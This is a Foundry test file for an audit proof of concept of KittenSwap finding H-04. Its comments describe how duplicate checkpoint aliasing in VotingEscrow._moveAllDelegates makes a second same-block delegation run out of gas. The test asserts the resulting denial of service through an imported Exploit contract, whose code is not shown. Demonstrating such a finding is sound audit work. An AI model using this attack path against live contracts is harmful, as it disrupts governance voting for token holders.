// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, VotingEscrow, MarkerToken} from "./58155-h-04-duplicate-tokenid-in-delegate-list-may-inflate-votes-pa.sol";

// KittenSwap H-04 (finding 58155): duplicate tokenId in delegate list.
// VotingEscrow._moveAllDelegates reuses the latest checkpoint on a same-block
// move (_findWhatCheckpointToWrite returns _nCheckPoints-1), so dstRepNew aliases
// dstRepOld and the verbatim copy loop self-appends without bound. A second
// same-block delegation to the same delegatee runs out of gas and reverts:
// a denial of service of the governance delegation / vote-move path.
contract Finding58155Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_sameBlockRedelegation_bricksDelegation() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("delegatee votes after 1st (legit) delegation", e.votesAfterFirst());
        emit log_named_string("2nd same-block delegation reverted?", e.secondMoveReverted() ? "YES (DoS)" : "NO");
        emit log_named_uint("delegatee votes after 2nd (bricked) delegation", e.votesAfterSecond());
        emit log_named_uint("bricked voting weight recorded at SINK", e.brickedVotesToSink());

        assertEq(e.votesAfterFirst(), 1, "first delegation registered 1 vote");
        assertTrue(e.secondMoveReverted(), "second same-block delegation must revert (DoS)");
        assertEq(e.votesAfterSecond(), 1, "second delegation must not have applied");
        assertEq(e.brickedVotesToSink(), 1000e18, "harm magnitude minted to SINK");

        MarkerToken marker = e.marker();
        assertEq(marker.balanceOf(SINK), 1000e18, "SINK holds bricked-vote marker");
    }
}
